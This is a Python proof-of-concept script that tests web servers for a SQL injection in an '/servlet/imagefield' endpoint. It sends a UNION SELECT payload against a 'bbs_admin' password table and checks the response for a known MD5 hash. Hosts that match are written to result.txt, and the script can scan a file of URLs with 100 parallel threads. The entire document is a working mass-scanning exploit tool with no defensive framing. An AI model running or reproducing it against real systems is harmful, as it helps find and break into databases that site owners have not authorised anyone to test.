import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) ", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive"}
def poc(target):
    url_payload = "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','1'))--+"
    url = target+url_payload
    res1 = requests.get(url=target,verify=False)
    if res1.status_code == 200:
        res2 = requests.get(url=url,headers=headers,verify=False)
        if 'c4ca4238a0b923820dcc509a6f75849b' in res2.text:
            print('\033[1;31;40m',end="")
            print(f'[+]{target}存在SQL注入',end="")
            print('\033[0m')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在SQL注入')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()